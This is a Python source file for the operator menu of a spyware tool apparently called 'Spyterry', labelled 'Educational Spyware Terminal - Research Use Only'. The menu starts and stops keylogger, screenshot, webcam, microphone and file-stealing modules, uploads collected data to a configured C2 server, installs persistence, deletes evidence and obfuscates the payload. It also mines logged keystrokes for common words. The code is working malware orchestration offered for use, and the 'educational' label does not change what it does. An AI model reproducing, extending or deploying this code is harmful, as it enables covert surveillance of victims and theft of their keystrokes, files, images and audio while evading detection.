import time
import threading
import json
import requests
from pathlib import Path
from colorama import Fore, Style, init
from core.persistence import Persistence
from modules.exfiltration.uploader import DataUploader
from modules.recon.system_info import SystemInfo
from modules.recon.network import NetworkScanner
from modules.recon.process_mon import ProcessMonitor
from modules.exfiltration.file_stealer import FileStealer
from utils.cleanup import Cleanup
from utils.obfuscation import Obfuscator
from collections import Counter

class Menu:
    def __init__(self, payload):
        init()  # Initialize colorama
        self.payload = payload
        self.uploader = DataUploader(payload.config.config['c2_server'])
        self.running = True
        self.modules_status = {
            "Keylogger": False,
            "Screenshot": False,
            "Webcam": False,
            "Microphone": False,
            "System Monitor": False,
            "Network Scanner": False,
            "Process Monitor": False,
            "File Stealer": False
        }
        self.module_threads = {}
        self.banner = f"""
{Fore.RED}
  _____       _                       
 / ____|     | |                      
| (___  _ __ | |_ ___ _ __ _ __ _   _ 
 \___ \| '_ \| __/ _ \ '__| '__| | | |
 ____) | |_) | ||  __/ |  | |  | |_| |
|_____/| .__/ \__\___|_|  |_|   \__, |
       | |                        __/ |
       |_|                       |___/ 
{Style.RESET_ALL}
"""

    def display(self):
        """Display main menu with enhanced options"""
        print(self.banner)
        print(f"{Fore.YELLOW}Educational Spyware Terminal - Research Use Only{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Version: 2.0 | Modules: {len(self.modules_status)}{Style.RESET_ALL}\n")
        
        while self.running:
            self._clear_screen()
            self._show_status()
            
            print("\nMain Menu:")
            print(f"{Fore.GREEN}1. Module Control Center{Style.RESET_ALL}")
            print(f"{Fore.GREEN}2. Data Collection & Exfiltration{Style.RESET_ALL}")
            print(f"{Fore.GREEN}3. System Operations{Style.RESET_ALL}")
            print(f"{Fore.GREEN}4. Configuration{Style.RESET_ALL}")
            print(f"{Fore.RED}5. Exit{Style.RESET_ALL}")
            
            choice = input("\nSelect option: ").strip()
            
            if choice == "1":
                self._module_control_menu()
            elif choice == "2":
                self._data_menu()
            elif choice == "3":
                self._system_menu()
            elif choice == "4":
                self._config_menu()
            elif choice == "5":
                self._safe_exit()
            else:
                self._show_error("Invalid choice!")

    def _module_control_menu(self):
        """Submenu for module control"""
        while True:
            self._clear_screen()
            self._show_status()
            
            print("\nModule Control Center:")
            for i, (name, status) in enumerate(self.modules_status.items(), 1):
                color = Fore.GREEN if status else Fore.RED
                print(f"{color}{i}. {name}: {'ACTIVE' if status else 'INACTIVE'}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}9. Back to Main Menu{Style.RESET_ALL}")
            
            choice = input("\nSelect module to toggle (1-8) or 9 to return: ").strip()
            
            if choice == "9":
                break
            elif choice.isdigit() and 1 <= int(choice) <= len(self.modules_status):
                module_name = list(self.modules_status.keys())[int(choice)-1]
                self._toggle_module(module_name)
            else:
                self._show_error("Invalid selection!")

    def _toggle_module(self, module_name):
        """Start or stop a module"""
        if self.modules_status[module_name]:
            # Stop module
            if module_name in self.module_threads:
                if hasattr(self.module_threads[module_name], 'running'):
                    self.module_threads[module_name].running = False
                del self.module_threads[module_name]
            self.modules_status[module_name] = False
            self._show_success(f"{module_name} stopped")
        else:
            # Start module
            try:
                if module_name == "Keylogger":
                    from modules.surveillance.keylogger import Keylogger
                    module = Keylogger(self.payload.config.config['keylog_interval'])
                elif module_name == "Screenshot":
                    from modules.surveillance.screenshot import ScreenshotCapture
                    module = ScreenshotCapture(self.payload.config.config['screenshot_interval'])
                elif module_name == "Webcam":
                    from modules.surveillance.webcam import WebcamCapture
                    module = WebcamCapture(self.payload.config.config['webcam_interval'])
                elif module_name == "Microphone":
                    from modules.surveillance.microphone import MicrophoneRecorder
                    module = MicrophoneRecorder(self.payload.config.config['mic_duration'])
                elif module_name == "System Monitor":
                    module = SystemInfo()
                elif module_name == "Network Scanner":
                    module = NetworkScanner()
                elif module_name == "Process Monitor":
                    module = ProcessMonitor()
                elif module_name == "File Stealer":
                    module = FileStealer()
                
                t = threading.Thread(target=module.start)
                t.daemon = True
                t.start()
                self.module_threads[module_name] = module
                self.modules_status[module_name] = True
                self._show_success(f"{module_name} started")
            except Exception as e:
                self._show_error(f"Failed to start {module_name}: {str(e)}")
        time.sleep(1)

    def _data_menu(self):
        """Submenu for data operations"""
        while True:
            self._clear_screen()
            
            print("\nData Collection & Exfiltration:")
            print(f"{Fore.GREEN}1. View Collected Data{Style.RESET_ALL}")
            print(f"{Fore.GREEN}2. Upload Data to C2{Style.RESET_ALL}")
            print(f"{Fore.GREEN}3. Export Data Locally{Style.RESET_ALL}")
            print(f"{Fore.GREEN}4. Data Analysis Tools{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}9. Back to Main Menu{Style.RESET_ALL}")
            
            choice = input("\nSelect option: ").strip()
            
            if choice == "1":
                self._view_data()
            elif choice == "2":
                self._upload_data()
            elif choice == "3":
                self._export_data()
            elif choice == "4":
                self._data_analysis()
            elif choice == "9":
                break
            else:
                self._show_error("Invalid selection!")

    def _view_data(self):
        """View collected data"""
        self._clear_screen()
        print(f"\n{Fore.CYAN}=== Collected Data Summary ==={Style.RESET_ALL}")
        
        data_dir = Path('data/')
        if not data_dir.exists():
            print(f"{Fore.YELLOW}No data collected yet.{Style.RESET_ALL}")
            return
        
        # Show data statistics
        print(f"{Fore.GREEN}Keylogs:{Style.RESET_ALL}")
        keylog_file = data_dir / 'logs/keystrokes.log'
        if keylog_file.exists():
            with keylog_file.open() as f:
                lines = f.readlines()
                print(f"  Entries: {len(lines)}")
                print(f"  Last 5 entries:")
                for line in lines[-5:]:
                    print(f"  - {line.strip()}")
        else:
            print(f"  {Fore.YELLOW}No keylog data{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}Screenshots:{Style.RESET_ALL}")
        screenshot_dir = data_dir / 'screenshots'
        if screenshot_dir.exists():
            screenshots = list(screenshot_dir.glob('*.png'))
            print(f"  Count: {len(screenshots)}")
            if screenshots:
                print(f"  Last taken: {screenshots[-1].name}")
        else:
            print(f"  {Fore.YELLOW}No screenshots{Style.RESET_ALL}")
        
        input("\nPress Enter to continue...")

    def _upload_data(self):
        """Upload collected data to C2"""
        self._clear_screen()
        print(f"\n{Fore.CYAN}=== Data Exfiltration ==={Style.RESET_ALL}")
        
        try:
            print(f"{Fore.YELLOW}Uploading data to C2 server...{Style.RESET_ALL}")
            self.uploader.upload_data()
            self._show_success("Data uploaded successfully!")
        except Exception as e:
            self._show_error(f"Upload failed: {str(e)}")
        time.sleep(2)

    def _system_menu(self):
        """Submenu for system operations"""
        while True:
            self._clear_screen()
            
            print("\nSystem Operations:")
            print(f"{Fore.GREEN}1. Install Persistence{Style.RESET_ALL}")
            print(f"{Fore.GREEN}2. Check System Integrity{Style.RESET_ALL}")
            print(f"{Fore.GREEN}3. Cleanup Evidence{Style.RESET_ALL}")
            print(f"{Fore.GREEN}4. Obfuscate Payload{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}9. Back to Main Menu{Style.RESET_ALL}")
            
            choice = input("\nSelect option: ").strip()
            
            if choice == "1":
                self._install_persistence()
            elif choice == "2":
                self._check_integrity()
            elif choice == "3":
                self._cleanup_evidence()
            elif choice == "4":
                self._obfuscate_payload()
            elif choice == "9":
                break
            else:
                self._show_error("Invalid selection!")

    def _install_persistence(self):
        """Install persistence mechanisms"""
        self._clear_screen()
        print(f"\n{Fore.CYAN}=== Persistence Installation ==={Style.RESET_ALL}")
        
        try:
            Persistence.install()
            self._show_success("Persistence installed successfully!")
        except Exception as e:
            self._show_error(f"Installation failed: {str(e)}")
        time.sleep(2)

    def _check_integrity(self):
        """Check system integrity and module status"""
        self._clear_screen()
        print(f"\n{Fore.CYAN}=== System Integrity Check ==={Style.RESET_ALL}")
        
        # Check module status
        print(f"\n{Fore.YELLOW}Module Status:{Style.RESET_ALL}")
        for name, status in self.modules_status.items():
            status_color = Fore.GREEN if status else Fore.RED
            print(f"  {name}: {status_color}{'RUNNING' if status else 'STOPPED'}{Style.RESET_ALL}")
        
        # Check data collection
        print(f"\n{Fore.YELLOW}Data Collection:{Style.RESET_ALL}")
        data_dir = Path('data/')
        if data_dir.exists():
            keylogs = len(list((data_dir / 'logs').glob('*.log'))) if (data_dir / 'logs').exists() else 0
            screenshots = len(list((data_dir / 'screenshots').glob('*.png'))) if (data_dir / 'screenshots').exists() else 0
            print(f"  Keylogs: {keylogs} | Screenshots: {screenshots}")
        else:
            print(f"  {Fore.RED}No data directory found{Style.RESET_ALL}")
        
        # Check C2 connection
        print(f"\n{Fore.YELLOW}C2 Connection:{Style.RESET_ALL}")
        try:
            response = requests.get(f"{self.payload.config.config['c2_server']}/status", timeout=5)
            if response.status_code == 200:
                print(f"  {Fore.GREEN}Connection successful{Style.RESET_ALL}")
            else:
                print(f"  {Fore.YELLOW}Connection failed (HTTP {response.status_code}){Style.RESET_ALL}")
        except Exception as e:
            print(f"  {Fore.RED}Connection failed: {str(e)}{Style.RESET_ALL}")
        
        input("\nPress Enter to continue...")

    def _cleanup_evidence(self):
        """Clean up collected data"""
        self._clear_screen()
        print(f"\n{Fore.CYAN}=== Evidence Cleanup ==={Style.RESET_ALL}")
        
        confirm = input(f"{Fore.RED}WARNING: This will delete all collected data. Continue? (y/n): {Style.RESET_ALL}")
        if confirm.lower() == 'y':
            try:
                Cleanup().execute()
                self._show_success("Evidence cleaned successfully!")
            except Exception as e:
                self._show_error(f"Cleanup failed: {str(e)}")
        time.sleep(2)

    def _obfuscate_payload(self):
        """Obfuscate the payload code"""
        self._clear_screen()
        print(f"\n{Fore.CYAN}=== Payload Obfuscation ==={Style.RESET_ALL}")
        
        try:
            obfuscator = Obfuscator()
            with open(__file__, 'r') as f:
                original_code = f.read()
            obfuscated_code = obfuscator.obfuscate_python(original_code)
            output_path = 'obfuscated_payload.py'
            with open(output_path, 'w') as f:
                f.write(obfuscated_code)
            self._show_success(f"Obfuscated payload saved to {output_path}")
        except Exception as e:
            self._show_error(f"Obfuscation failed: {str(e)}")
        time.sleep(2)

    def _config_menu(self):
        """Submenu for configuration"""
        while True:
            self._clear_screen()
            
            print("\nConfiguration:")
            print(f"{Fore.GREEN}1. View Current Config{Style.RESET_ALL}")
            print(f"{Fore.GREEN}2. Modify Settings{Style.RESET_ALL}")
            print(f"{Fore.GREEN}3. Reset to Defaults{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}9. Back to Main Menu{Style.RESET_ALL}")
            
            choice = input("\nSelect option: ").strip()
            
            if choice == "1":
                self._view_config()
            elif choice == "2":
                self._modify_config()
            elif choice == "3":
                self._reset_config()
            elif choice == "9":
                break
            else:
                self._show_error("Invalid selection!")

    def _view_config(self):
        """View current configuration"""
        self._clear_screen()
        print(f"\n{Fore.CYAN}=== Current Configuration ==={Style.RESET_ALL}")
        
        for key, value in self.payload.config.config.items():
            print(f"{Fore.GREEN}{key}:{Style.RESET_ALL} {value}")
        
        input("\nPress Enter to continue...")

    def _modify_config(self):
        """Modify configuration settings"""
        self._clear_screen()
        print(f"\n{Fore.CYAN}=== Configuration Modification ==={Style.RESET_ALL}")
        
        config = self.payload.config.config
        for i, (key, value) in enumerate(config.items(), 1):
            print(f"{i}. {key}: {value}")
        
        print(f"\n{Fore.YELLOW}Select setting to modify (1-{len(config)}) or Enter to cancel:{Style.RESET_ALL}")
        choice = input("> ").strip()
        
        if choice.isdigit() and 1 <= int(choice) <= len(config):
            selected_key = list(config.keys())[int(choice)-1]
            current_value = config[selected_key]
            
            print(f"\nCurrent value for {selected_key}: {current_value}")
            new_value = input(f"Enter new value (current: {current_value}): ").strip()
            
            if new_value:
                try:
                    # Try to convert to appropriate type
                    if isinstance(current_value, bool):
                        config[selected_key] = new_value.lower() in ('true', '1', 'yes')
                    elif isinstance(current_value, int):
                        config[selected_key] = int(new_value)
                    elif isinstance(current_value, float):
                        config[selected_key] = float(new_value)
                    else:
                        config[selected_key] = new_value
                    
                    self.payload.config.save_config()
                    self._show_success(f"Updated {selected_key} to {config[selected_key]}")
                except ValueError as e:
                    self._show_error(f"Invalid value: {str(e)}")
            else:
                self._show_warning("No changes made")
        else:
            self._show_warning("Configuration modification cancelled")
        
        time.sleep(1.5)

    def _reset_config(self):
        """Reset configuration to defaults"""
        self._clear_screen()
        confirm = input(f"{Fore.RED}WARNING: This will reset all settings to defaults. Continue? (y/n): {Style.RESET_ALL}")
        
        if confirm.lower() == 'y':
            try:
                self.payload.config.config = self.payload.config.default_config
                self.payload.config.save_config()
                self._show_success("Configuration reset to defaults")
            except Exception as e:
                self._show_error(f"Reset failed: {str(e)}")
        else:
            self._show_warning("Configuration reset cancelled")
        
        time.sleep(1.5)

    def _export_data(self):
        """Export collected data to a zip file"""
        self._clear_screen()
        print(f"\n{Fore.CYAN}=== Data Export ==={Style.RESET_ALL}")
        
        try:
            from modules.exfiltration.compression import compress_data
            archive_path = compress_data()
            self._show_success(f"Data exported to {archive_path}")
        except Exception as e:
            self._show_error(f"Export failed: {str(e)}")
        
        input("\nPress Enter to continue...")

    def _data_analysis(self):
        """Basic data analysis tools"""
        self._clear_screen()
        print(f"\n{Fore.CYAN}=== Data Analysis Tools ==={Style.RESET_ALL}")
        
        print("\nAvailable analysis options:")
        print(f"{Fore.GREEN}1. Show keyboard activity timeline{Style.RESET_ALL}")
        print(f"{Fore.GREEN}2. Analyze screenshot frequency{Style.RESET_ALL}")
        print(f"{Fore.GREEN}3. View system resource usage trends{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}9. Back{Style.RESET_ALL}")
        
        choice = input("\nSelect option: ").strip()
        
        if choice == "1":
            self._analyze_keyboard_activity()
        elif choice == "2":
            self._analyze_screenshot_frequency()
        elif choice == "3":
            self._analyze_resource_usage()
        elif choice == "9":
            return
        else:
            self._show_error("Invalid selection!")
            time.sleep(1)

    def _analyze_keyboard_activity(self):
        """Analyze keyboard activity patterns"""
        self._clear_screen()
        print(f"\n{Fore.CYAN}=== Keyboard Activity Analysis ==={Style.RESET_ALL}")
        
        try:
            keylog_file = Path('data/logs/keystrokes.log')
            if not keylog_file.exists():
                raise FileNotFoundError("No keylog data available")
            
            with keylog_file.open() as f:
                lines = f.readlines()
            
            print(f"\nTotal keystrokes recorded: {len(lines)}")
            print(f"First recorded: {lines[0].split(' ')[0] if lines else 'N/A'}")
            print(f"Last recorded: {lines[-1].split(' ')[0] if lines else 'N/A'}")
            
            # Simple word frequency analysis
            words = ' '.join(lines).split()
            common_words = Counter(words).most_common(10)
            
            print("\nMost common words:")
            for word, count in common_words:
                print(f"  {word}: {count}")
        
        except Exception as e:
            self._show_error(f"Analysis failed: {str(e)}")
        
        input("\nPress Enter to continue...")

    def _analyze_screenshot_frequency(self):
        """Analyze screenshot patterns"""
        self._clear_screen()
        print(f"\n{Fore.CYAN}=== Screenshot Frequency Analysis ==={Style.RESET_ALL}")
        
        try:
            screenshot_dir = Path('data/screenshots')
            if not screenshot_dir.exists():
                raise FileNotFoundError("No screenshot data available")
            
            screenshots = list(screenshot_dir.glob('*.png'))
            timestamps = [s.stem.split('_')[-1] for s in screenshots]
            
            print(f"\nTotal screenshots taken: {len(screenshots)}")
            print(f"First screenshot: {timestamps[0] if timestamps else 'N/A'}")
            print(f"Last screenshot: {timestamps[-1] if timestamps else 'N/A'}")
            
            # Calculate time between screenshots
            if len(timestamps) > 1:
                from datetime import datetime
                fmt = "%Y%m%d%H%M%S"
                times = [datetime.strptime(ts, fmt) for ts in timestamps]
                intervals = [(times[i+1] - times[i]).total_seconds() for i in range(len(times)-1)]
                avg_interval = sum(intervals) / len(intervals)
                print(f"\nAverage interval between screenshots: {avg_interval:.1f} seconds")
        
        except Exception as e:
            self._show_error(f"Analysis failed: {str(e)}")
        
        input("\nPress Enter to continue...")

    def _analyze_resource_usage(self):
        """Analyze system resource patterns"""
        self._clear_screen()
        print(f"\n{Fore.CYAN}=== Resource Usage Analysis ==={Style.RESET_ALL}")
        
        try:
            sysinfo_file = Path('data/logs/system_info.txt')
            if not sysinfo_file.exists():
                raise FileNotFoundError("No system info data available")
            
            with sysinfo_file.open() as f:
                data = json.load(f)
            
            print("\nSystem Resources:")
            print(f"CPU Cores: {data['cpu']['cores']}")
            print(f"CPU Usage: {data['cpu']['usage']}%")
            print(f"Memory Usage: {data['memory']['percent']}%")
            print(f"Disk Usage:")
            for disk in data['disk']:
                print(f"  {disk['device']}: {disk['percent']}%")
        
        except Exception as e:
            self._show_error(f"Analysis failed: {str(e)}")
        
        input("\nPress Enter to continue...")

    def _safe_exit(self):
        """Clean exit procedure"""
        self._clear_screen()
        print(f"\n{Fore.CYAN}=== Shutting Down ==={Style.RESET_ALL}")
        
        # Stop all modules
        for name in list(self.modules_status.keys()):
            if self.modules_status[name]:
                self._toggle_module(name)
        
        print(f"{Fore.YELLOW}All modules stopped.{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Goodbye!{Style.RESET_ALL}")
        self.running = False

    def _show_status(self):
        """Show current system status"""
        print(f"\n{Fore.CYAN}=== System Status ==={Style.RESET_ALL}")
        
        # Show active modules
        active = [name for name, status in self.modules_status.items() if status]
        inactive = [name for name, status in self.modules_status.items() if not status]
        
        print(f"{Fore.GREEN}Active Modules:{Style.RESET_ALL} {', '.join(active) or 'None'}")
        print(f"{Fore.RED}Inactive Modules:{Style.RESET_ALL} {', '.join(inactive) or 'None'}")
        
        # Show data collection stats
        data_dir = Path('data/')
        if data_dir.exists():
            print(f"\n{Fore.CYAN}Data Collected:{Style.RESET_ALL}")
            keylogs = len(list((data_dir / 'logs').glob('*.log'))) if (data_dir / 'logs').exists() else 0
            screenshots = len(list((data_dir / 'screenshots').glob('*.png'))) if (data_dir / 'screenshots').exists() else 0
            print(f"  Keylogs: {keylogs} | Screenshots: {screenshots}")

    def _clear_screen(self):
        """Clear terminal screen"""
        print("\033[H\033[J", end="")

    def _show_success(self, message):
        print(f"{Fore.GREEN}[+] {message}{Style.RESET_ALL}")

    def _show_error(self, message):
        print(f"{Fore.RED}[-] {message}{Style.RESET_ALL}")

    def _show_warning(self, message):
        print(f"{Fore.YELLOW}[!] {message}{Style.RESET_ALL}")